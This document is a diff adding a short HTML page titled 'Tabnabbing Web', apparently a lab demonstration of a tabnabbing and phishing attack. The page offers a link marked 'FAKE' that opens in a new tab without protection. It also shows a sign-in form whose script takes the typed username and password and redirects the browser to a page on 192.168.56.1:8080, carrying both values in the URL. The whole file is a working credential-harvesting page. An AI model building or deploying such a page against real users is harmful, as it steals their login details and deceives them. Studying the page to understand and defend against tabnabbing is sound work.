@@ -1,0 +1,26 @@
+<html>
+<head>
+    <title>Tabnabbing Web</title>
+</head>
+<body>
+<li><a href="http://192.168.56.1:8080/B.html" target="_blank" >Sign In Web(FAKE！)</a></li>
+  Username：
+  <input type="text" name="myName" id="name1">
+  <br/>
+  Password：
+  <input type="password" name="pass" id ="pass1" >
+  <br/>
+   <button onclick="try1()">Sign In</button>
+  <script>
+    function try1(){
+    var myName = document.getElementById('name1').value;
+	  var pass = document.getElementById('pass1').value;
+    console.log(myName);
+    window.location.href="http://192.168.56.1:8080/D.html?name="+myName+"&password="+pass
+    }
+    
+    
+  </script>
+</body>
+</html>
+
